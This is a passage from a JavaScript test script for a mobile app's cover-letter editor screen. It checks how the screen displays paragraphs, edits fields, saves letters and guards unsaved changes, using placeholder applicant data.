      if (!richMod) richMod = { ...origLoad.call(this, RICH, ...Array.prototype.slice.call(arguments, 1)), RichTextModal: 'RichTextModal' };
      return richMod;
    }
    return origLoad.apply(this, arguments);
  };

  const PAYLOAD = () => ({
    coverLetterHtml: AI_LETTER, subject: 'Application for Senior Backend Engineer', companyName: 'Nordex SE', companyAddress: 'Langenhorner Chaussee 600, Hamburg',
    hiringManager: 'Hiring Manager', position: 'Senior Backend Engineer', brandColor: '#0a74da', fontName: null,
    locations: [{ address: 'Langenhorner Chaussee 600, Hamburg' }, { address: 'Erich-Schlesinger-Str. 50, Rostock' }],
  });
  async function open(o = {}) {
    delete require.cache[SCREEN];
    saves = []; saveAnswers = o.saveAnswers || []; alerts = []; fetches = []; pushes = []; backs = 0; stash = {}; prevent = null;
    params = { docId: '9' };
    doc = o.doc !== undefined ? o.doc : { docId: 9, kind: 'cover_letter', employer: 'Nordex', payload: o.payload || PAYLOAD() };
    const Screen = require(SCREEN).default;
    const c = mount(() => Screen());
    await flush(20);
    const h = {
      c,
      text: () => textOf(c.tree),
      /** The white card (Section / date card) whose text starts with `title`. */
      card: (title) => findAll(c.tree, (n) => n.type === 'View' && flat(n.props.style).borderRadius === 20 && flat(n.props.style).backgroundColor === '#FFFFFF' && textOf(n).startsWith(title))[0] || null,
      btnIn: (node, label) => node ? findAll(node, (n) => n.type === 'TouchableOpacity' && (textOf(n).trim() === label || n.props.accessibilityLabel === label))[0] || null : null,
      btn: (label) => findAll(c.tree, (n) => n.type === 'TouchableOpacity' && (textOf(n).trim() === label || n.props.accessibilityLabel === label))[0] || null,
      input: (placeholderRe) => findAll(c.tree, (n) => n.type === 'TextInput' && placeholderRe.test(String(n.props.placeholder || '')))[0] || null,
      modal: () => findAll(c.tree, (n) => n.type === 'RichTextModal')[0] || null,
      paragraphs: () => findAll(c.tree, (n) => n.type === 'View' && flat(n.props.style).borderRadius === 20 && /^PARAGRAPH \d+/.test(textOf(n))),
      async press(node) { if (!node) throw new Error('no such button'); node.props.onPress(); await flush(20); },
      async type(node, v) { if (!node) throw new Error('no such input'); node.props.onChangeText(v); await flush(8); },
      async alertButton(text) { const a = alerts[alerts.length - 1]; const b = a && a.buttons.find((x) => x.text === text); if (b && b.onPress) b.onPress(); await flush(20); },
      gens: () => fetches.filter((u) => !/\/users\/profile$|\/employer-docs\/9\/sender$/.test(u)),
    };
    return h;
  }

  {
    const h = await open();
    const paras = h.paragraphs();
    ok('⚠️ the letter opens as ONE CARD PER PARAGRAPH (3), titled PARAGRAPH 1..3', paras.length === 3 && /^PARAGRAPH 1/.test(textOf(paras[0])) && /^PARAGRAPH 3/.test(textOf(paras[2])), paras.map((p) => textOf(p).slice(0, 12)));
    // ContentText's bold run: fontWeight 700 in inkSoft (the header's Edit label is 700 too, in blue — not letter text).
    const boldIn = (node) => findAll(node, (n) => n.type === 'Text' && flat(n.props.style).fontWeight === '700' && flat(n.props.style).color === '#1A2046').map(textOf);
    const b1 = paras[0] ? boldIn(paras[0]) : [];
    ok('⚠️ a card shows its bold words BOLD (fontWeight 700) — the 5 in paragraph 1', b1.join('|') === 'Senior Backend Engineer|Nordex|8 years|Node.js|PostgreSQL', b1);
    ok('…15 bold runs across the three cards, as in the letter', paras.reduce((n, p) => n + boldIn(p).length, 0) === 15);
    ok('…and the AI\'s "a < b" and "&" show as the characters themselves', /a < b trade-offs/.test(textOf(paras[0] || null)) && /Node\.js & PostgreSQL/.test(textOf(paras[0] || null)), textOf(paras[0] || null).slice(0, 200));
    ok('every paragraph card has Edit, move up / down and Remove', paras.every((p, i) => h.btnIn(p, 'Edit') && h.btnIn(p, `Move paragraph ${i + 1} up`) && h.btnIn(p, `Move paragraph ${i + 1} down`) && h.btnIn(p, `Remove paragraph ${i + 1}`)));
    ok('nothing was saved and nothing but the profile + sender block was asked for, just by opening', saves.length === 0 && h.gens().length === 0, h.gens());

    // THE HERO: the photo on top, the sender as printed.
    const hero = findAll(h.c.tree, (n) => n.type === 'LinearGradient' && /Ann Example/.test(textOf(n)))[0];
    ok('⚠️ the hero shows the profile PHOTO on top, the name, the title and the contacts the letter prints',
      !!hero && findAll(hero, (n) => n.type === 'Image' && n.props.source && n.props.source.uri === 'https://api.test/uploads/photo.jpg').length === 1
      && /Engineer/.test(textOf(hero)) && /ann@example\.com/.test(textOf(hero)) && /\+49 1/.test(textOf(hero)) && /Berlin, Germany/.test(textOf(hero)), hero && textOf(hero));
    ok('the page follows the printed letter: hero, DATE, TO, SUBJECT, GREETING, paragraphs, SIGN-OFF', (() => {
      const t = h.text();
      const at = ['Ann Example', 'DATE', 'TO', 'Hiring Manager,', 'SUBJECT', 'GREETING', 'PARAGRAPH 1', 'PARAGRAPH 3', 'SIGN-OFF'].map((w) => t.indexOf(w));
      return at.every((x, i) => x >= 0 && (i === 0 || x > at[i - 1]));
    })(), h.text().slice(0, 300));
    ok('the DATE is read-only and says why ("Dated the day you download")', !!h.card('DATE') && /Dated the day\s*you download/.test(textOf(h.card('DATE'))) && !h.btnIn(h.card('DATE'), 'Edit'));
    ok('⚠️ the SUBJECT says it is not printed (no promise the PDF never keeps)', /do not print a subject line/.test(textOf(h.card('SUBJECT'))));
    ok('the GREETING shows the design default until one is set', /Dear Hiring Manager,/.test(textOf(h.card('GREETING'))) && /own greeting/.test(textOf(h.card('GREETING'))));
    ok('the SIGN-OFF shows the closing, the signature (read-only, where it prints) and the name',
      /Sincerely,/.test(textOf(h.card('SIGN-OFF'))) && /signature prints on the Original \(Branded\) design/.test(textOf(h.card('SIGN-OFF')))
      && findAll(h.card('SIGN-OFF'), (n) => n.type === 'Image' && n.props.source.uri === 'https://api.test/uploads/sig.png').length === 1 && /Ann Example/.test(textOf(h.card('SIGN-OFF'))));
    ok('the floating bar is one "Download / Preview" button — no Regenerate, nothing that charges', !!h.btn('Download / Preview') && !/Regenerate|Credits?/i.test(h.text()));
    ok('the leave guard is DOWN on an untouched letter', prevent && prevent.cond === false);

    // ⚠️ EDIT A PARAGRAPH: the résumé's Quill box, bold in the box, bold only (the one format every design prints).
    await h.press(h.btnIn(h.paragraphs()[1], 'Edit'));
    const m = h.modal();
    ok('⚠️ Edit opens the rich-text box on THAT paragraph, with its bold as <strong> (bold in the box too)',
      !!m && m.props.visible === true && m.props.title === 'Paragraph 2' && strongs(m.props.initialMd) === 6 && /^<p>At <strong>Siemens<\/strong>/.test(m.props.initialMd) && !/style=/.test(m.props.initialMd), m && m.props.initialMd);
    ok('⚠️ …narrowed to BOLD ONLY (no heading / underline the server strips, no italic the Original PDF prints upright)', m && JSON.stringify(m.props.formats) === JSON.stringify(['bold']), m && m.props.formats);
    ok('…the very list section 4 proved prints in every design', m && JSON.stringify(m.props.formats) === JSON.stringify(EDITOR_FORMATS), { passed: m && m.props.formats, EDITOR_FORMATS });
    ok('…and its hint names only B (no heading, underline or italic promised)', m && !/heading|underline|italic/i.test(textOf({ $el: true, children: [m.props.hint] })) && /bold/.test(textOf({ $el: true, children: [m.props.hint] })));
    m.props.onDone('<p>At <strong>Siemens</strong> I led <strong>payments</strong> and platform work.</p><p><br></p>');
    await flush(30);
    ok('⚠️ Done saves ONCE, straight away (PUT via saveDocPayload, doc 9)', saves.length === 1 && saves[0].id === 9, saves.length);
    const s1 = saves[0] ? saves[0].payload : {};
    const cards1 = L.splitLetterParagraphs(s1.coverLetterHtml || '');
    ok('⚠️ the saved letter: paragraph 2 replaced, paragraphs 1 and 3 with their bold untouched', cards1.length === 3 && cards1.map((b) => strongs(b.html)).join(',') === '5,2,4' && cards1[1].html === 'At <strong>Siemens</strong> I led <strong>payments</strong> and platform work.', cards1);
    ok('…every other payload key exactly as it was, and no sender / greeting / closing invented',
      JSON.stringify({ ...s1, coverLetterHtml: null }) === JSON.stringify({ ...PAYLOAD(), coverLetterHtml: null }) && !('sender' in s1) && !('salutation' in s1) && !('closing' in s1), Object.keys(s1));
    ok('the modal closed, the card shows the new words bold, and the page says Saved',
      !h.modal().props.visible && /I led payments and platform work/.test(textOf(h.paragraphs()[1])) && /Saved/.test(h.text()));
    ok('⚠️ nothing generated or charged: no request left the page except the profile reads', h.gens().length === 0, h.gens());

    // Enter inside a paragraph → two cards; Add paragraph appends; an empty add adds nothing.
    await h.press(h.btnIn(h.paragraphs()[2], 'Edit'));
    h.modal().props.onDone('<p>I would welcome the chance to bring <strong>reliability</strong>.</p><p>And <strong>ownership</strong> to your team.</p>');
    await flush(30);
    ok('Enter in the box splits the paragraph into two cards (and saves)', h.paragraphs().length === 4 && saves.length === 2);
    await h.press(h.btn('Add paragraph'));
    ok('Add paragraph opens an empty box titled "New paragraph"', h.modal().props.visible && h.modal().props.title === 'New paragraph' && h.modal().props.initialMd === '');
    h.modal().props.onDone('<p><br></p>');
    await flush(20);
    ok('…an empty new paragraph adds nothing and saves nothing', h.paragraphs().length === 4 && saves.length === 2);
    await h.press(h.btn('Add paragraph'));
    h.modal().props.onDone('<p>Thank you for your <strong>time</strong>.</p>');
    await flush(30);
    ok('…a written one is appended as the last card and saved', h.paragraphs().length === 5 && saves.length === 3 && /Thank you for your <strong>time<\/strong>\.<\/p>$/.test(saves[2].payload.coverLetterHtml));

    // Move and remove.
    await h.press(h.btn('Move paragraph 1 down'));
    const order = L.splitLetterParagraphs(saves[saves.length - 1].payload.coverLetterHtml).map((b) => b.html.slice(0, 8));
    ok('move down swaps two cards and saves', saves.length === 4 && order[0] === 'At <stro' && order[1] === 'I am wri', order);
    await h.press(h.btn('Remove paragraph 5'));
    ok('Remove asks first', alerts.length === 1 && /Remove paragraph 5\?/.test(alerts[0].title) && saves.length === 4);
    await h.alertButton('Remove');
    ok('…and removes that card only on Remove', saves.length === 5 && h.paragraphs().length === 4 && !/Thank you/.test(saves[4].payload.coverLetterHtml));
    h.c.unmount();
  }

  {
    // ⚠️ THE FIELD CARDS: Edit → change → Done = ONE save with only what changed; the letter HTML byte for byte.
    const h = await open();
    await h.press(h.btnIn(h.card('SUBJECT'), 'Edit'));
    ok('SUBJECT → Edit opens its input; the other Edit buttons step aside', !!h.input(/^Application for/) && !h.btnIn(h.card('GREETING'), 'Edit') && !h.btnIn(h.paragraphs()[0], 'Edit'));
    await h.type(h.input(/^Application for/), 'Application: Senior Backend Engineer (Hamburg)');
    ok('⚠️ an unsaved field arms the leave guard, and the top bar offers Save', prevent.cond === true && !!h.btn('Save letter'));
    await h.press(h.btnIn(h.card('SUBJECT'), 'Done'));
    const p = saves[0] && saves[0].payload;
    ok('⚠️ Done saves the subject — and sends the stored letter HTML back BYTE FOR BYTE (no rewrite of an unedited letter)',
      saves.length === 1 && p.subject === 'Application: Senior Backend Engineer (Hamburg)' && p.coverLetterHtml === AI_LETTER, p && Object.keys(p));
    ok('…nothing else changed, no key invented', JSON.stringify({ ...p, subject: null }) === JSON.stringify({ ...PAYLOAD(), subject: null }));
    ok('…the guard is down again', prevent.cond === false);

    // FROM, opened by the hero's Edit: one field changed → sender = { that field } only.
    await h.press(h.btn('Edit your details'));
    ok('⚠️ the hero\'s Edit opens FROM: name, title, email, phone, location — and the photo, read-only, with where to change it',
      !!h.card('FROM') && ['Your name', 'Ann Example', 'e.g. Senior Software Engineer', 'email@example.com', 'Phone', 'City, Country'].filter((ph) => h.input(new RegExp('^' + ph.replace(/[.+]/g, '\\$&') + '$'))).length >= 5
      && /Your profile photo — change it in Profile/.test(textOf(h.card('FROM'))), textOf(h.card('FROM') || null).slice(0, 200));
    await h.type(h.input(/^Phone$/), '+49 555 0100');
    await h.press(h.btnIn(h.card('FROM'), 'Done'));
    ok('⚠️ Done stores ONLY the changed line as an override: sender = { phone }', saves.length === 2 && JSON.stringify(saves[1].payload.sender) === JSON.stringify({ phone: '+49 555 0100' }), saves[1] && saves[1].payload.sender);
    ok('…and the hero prints it now', /\+49 555 0100/.test(textOf(findAll(h.c.tree, (n) => n.type === 'LinearGradient' && /Ann Example/.test(textOf(n)))[0] || null)));
    await h.press(h.btn('Edit your details'));
    await h.type(h.input(/^Phone$/), '+49 1');
    await h.press(h.btnIn(h.card('FROM'), 'Done'));
    ok('setting a line back to the profile\'s value removes the override (the letter follows the profile again)', saves.length === 3 && !('sender' in saves[2].payload), saves[2] && saves[2].payload.sender);

    // GREETING and SIGN-OFF.
    await h.press(h.btnIn(h.card('GREETING'), 'Edit'));
    await h.type(h.input(/^Design default \(Dear Hiring Manager,\)$/), 'Dear Ms. Smith,');
    await h.press(h.btnIn(h.card('GREETING'), 'Done'));
    ok('⚠️ the greeting is editable: payload.salutation', saves.length === 4 && saves[3].payload.salutation === 'Dear Ms. Smith,' && /Dear Ms\. Smith,/.test(textOf(h.card('GREETING'))));
    await h.press(h.btnIn(h.card('GREETING'), 'Edit'));
    await h.type(h.input(/^Design default/), '');
    await h.press(h.btnIn(h.card('GREETING'), 'Done'));
    ok('…cleared, the key goes and the design\'s own greeting prints again', saves.length === 5 && !('salutation' in saves[4].payload));
    await h.press(h.btnIn(h.card('SIGN-OFF'), 'Edit'));
    await h.type(h.input(/^Design default \(Sincerely,\)$/), 'Kind regards,');
    await h.type(h.input(/^Ann Example$/), 'Ann B. Example');
    await h.press(h.btnIn(h.card('SIGN-OFF'), 'Done'));
    ok('⚠️ the sign-off is editable: the closing word AND the name printed under it', saves.length === 6 && saves[5].payload.closing === 'Kind regards,' && JSON.stringify(saves[5].payload.sender) === JSON.stringify({ name: 'Ann B. Example' }), saves[5] && saves[5].payload);

    // TO: company, address (lines → commas), and the offices the research found.
    await h.press(h.btnIn(h.card('TO'), 'Edit'));
    ok('TO shows "Hiring Manager," read-only and offers the offices we found as chips', /Hiring Manager,/.test(textOf(h.card('TO'))) && /Rostock/.test(textOf(h.card('TO'))));
    await h.type(h.input(/^Nordex$/), 'Nordex Energy SE');
    await h.type(h.input(/^Street, City, Country$/), 'Erich-Schlesinger-Str. 50\n18059 Rostock');
    await h.press(h.btnIn(h.card('TO'), 'Done'));
    ok('⚠️ the company and the address are editable; typed lines print as one line', saves.length === 7 && saves[6].payload.companyName === 'Nordex Energy SE' && saves[6].payload.companyAddress === 'Erich-Schlesinger-Str. 50, 18059 Rostock', saves[6] && saves[6].payload);
    await h.press(h.btnIn(h.card('TO'), 'Edit'));
    await h.press(findAll(h.card('TO'), (n) => n.type === 'TouchableOpacity' && /Langenhorner/.test(textOf(n)))[0]);
    await h.press(h.btnIn(h.card('TO'), 'Done'));
    ok('…or picked from an office chip', saves.length === 8 && saves[7].payload.companyAddress === 'Langenhorner Chaussee 600, Hamburg');
    await h.press(h.btnIn(h.card('SUBJECT'), 'Edit'));
    await h.press(h.btnIn(h.card('SUBJECT'), 'Done'));
    ok('Done with nothing changed stores nothing', saves.length === 8);
    await h.press(h.btnIn(h.card('SUBJECT'), 'Edit'));
    await h.type(h.input(/^Application for/), 'Something else');
    await h.press(h.btn('Cancel'));
    ok('Cancel drops the change, stores nothing, and lowers the guard', saves.length === 8 && prevent.cond === false && !/Something else/.test(h.text()));

    await h.press(h.btn('Download / Preview'));
    ok('Download / Preview (nothing unsaved) opens the gallery on THIS doc — no save, no charge',
      pushes.length === 1 && pushes[0].pathname === '/(cover-letter)/templates' && pushes[0].params.docId === '9' && saves.length === 8
      && JSON.parse(stash.coverLetterPickerContext || '{}').docId === 9 && h.gens().length === 0, pushes);
    h.c.unmount();
  }

  {
    // ⚠️ NOT SAVED IS SAID OUT LOUD — a failed paragraph save stays on screen, guarded, retried.
    const h = await open({ saveAnswers: [{ ok: false, reason: 'network', message: 'No connection.' }] });
    await h.press(h.btnIn(h.paragraphs()[0], 'Edit'));
    h.modal().props.onDone('<p>Rewritten <strong>opening</strong>.</p>');
    await flush(30);
    ok('a failed save says "Could not save" with the reason', alerts.some((a) => a.title === 'Could not save' && /No connection/.test(a.msg)), alerts);
    ok('⚠️ …the edit STAYS on screen as Not saved, with Retry, and the leave guard is armed',
      /Rewritten opening/.test(textOf(h.paragraphs()[0])) && /Not saved/.test(h.text()) && /Retry/.test(h.text()) && prevent.cond === true, h.text().slice(0, 300));
    await h.press(findAll(h.c.tree, (n) => n.type === 'TouchableOpacity' && /Retry/.test(textOf(n)))[0]);
    ok('Retry saves the same edit, and the guard comes down', saves.length === 2 && /Rewritten <strong>opening<\/strong>/.test(saves[1].payload.coverLetterHtml) && prevent.cond === false && !/Not saved/.test(h.text()));
    h.c.unmount();
  }
  {
    const h = await open({ saveAnswers: [{ ok: false, reason: 'too_big' }] });
    await h.press(h.btnIn(h.card('GREETING'), 'Edit'));
    await h.type(h.input(/^Design default/), 'Hello team,');
    await h.press(h.btnIn(h.card('GREETING'), 'Done'));
    ok('too big → "Too long to save", and the card stays open with the text', alerts.some((a) => a.title === 'Too long to save') && !!h.input(/^Design default/) && prevent.cond === true);
    h.c.unmount();
  }
  {
    const h = await open({ payload: { ...PAYLOAD(), coverLetterHtml: '<p>Only <strong>one</strong> paragraph.</p>' } });
    await h.press(h.btn('Remove paragraph 1'));
    ok('the last paragraph cannot be removed (refused before any request)', saves.length === 0 && alerts.some((a) => a.title === 'A letter needs some text'));
    await h.press(h.btnIn(h.paragraphs()[0], 'Edit'));
    h.modal().props.onDone('<p><br></p>');
    await flush(20);
    ok('…nor emptied in the box', saves.length === 0 && alerts.filter((a) => a.title === 'A letter needs some text').length === 2);
    h.c.unmount();
  }
  {
    const h = await open({ saveAnswers: [{ ok: false, reason: 'gone' }] });
    await h.press(h.btnIn(h.paragraphs()[0], 'Edit'));
    h.modal().props.onDone('<p>Changed.</p>');
    await flush(30);
    ok('a letter that is gone says so and leaves', alerts.some((a) => a.title === 'This letter is gone') && backs === 1);
    h.c.unmount();
  }
  {
    const h = await open({ doc: { docId: 9, kind: 'resume', employer: 'Nordex', payload: { personal_info: {} } } });
    ok('⚠️ a résumé doc id is refused, never edited as a letter', /This document is not a cover letter/.test(h.text()) && saves.length === 0);
    h.c.unmount();
  }

  console.log('── 6. the source rules ──');
  {
    const strip = (src) => src.replace(/\/\*[\s\S]*?\*\//g, '').split('\n').filter((l) => !/^\s*(\/\/|\*)/.test(l)).join('\n');
    const edSrc = fs.readFileSync(EDIT_SRC, 'utf8');
    const edC = strip(edSrc);
    ok('⚠️ the page never generates or charges (no generate / employer-build / consume / regenerate call)',
      !/generate|employer-build|consumeOnSuccess|checkBuildGate|autoBuild|regenerat/i.test(edC));
    ok('every write is saveDocPayload(docId, …)', (edC.match(/saveDocPayload\(/g) || []).length === 1 && /saveDocPayload\(docId, next\)/.test(edC));
    ok('the unsaved-changes guard is usePreventRemove (it reaches the native swipe)', /usePreventRemove\(dirty && !exit,/.test(edC) && !/addListener\('beforeRemove'/.test(edC));
    ok('the old **markdown** text box is gone', !/letterTextToHtml|letterHtmlToText|double asterisks/.test(edSrc));
    ok('house rules: the header, Ionicons only, StyleSheet.create', /^\/\/ AI Hub — new feature\. Safe to delete/.test(edSrc)
      && /^\/\/ AI Hub — new feature\. Safe to delete/.test(fs.readFileSync(RICH_SRC, 'utf8')) && /^\/\/ AI Hub — new feature\. Safe to delete/.test(fs.readFileSync(LETTER_HTML_SRC, 'utf8'))
      && !/MaterialIcons|FontAwesome|Feather/.test(edSrc) && /StyleSheet\.create/.test(edSrc));
    const richSrc = fs.readFileSync(RICH_SRC, 'utf8');
    ok('⚠️ the résumé page imports the SAME editor and renderer (extracted, not copied)',
      /import \{ RichTextModal, ContentText \} from '\.\.\/\.\.\/components\/rich-text\/RichText';/.test(fs.readFileSync(path.join(APP, 'app/(resume-builder)/preview.tsx'), 'utf8'))
      && !/function RichTextModal|function ContentText|function mdToHtml/.test(fs.readFileSync(path.join(APP, 'app/(resume-builder)/preview.tsx'), 'utf8')));
    ok('the résumé\'s toolbar is unchanged when no formats are passed', /modules:\{ toolbar:\[\[\{ header:\[2,3,false\] \}\],\['bold','italic','underline'\],\['clean'\]\] \}/.test(richSrc));
    ok('ContentText still enters HTML mode only on real rich-text tags', /<\\\/\?\(h\[1-6\]\|p\|div\|li\|ul\|ol\|br\|strong\|b\|em\|i\|u\|span\)/.test(richSrc));
  }

  console.log(`\nletter editor: ${pass} passed, ${fail} failed`);
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.log('CRASH', e && e.stack); process.exit(1); });
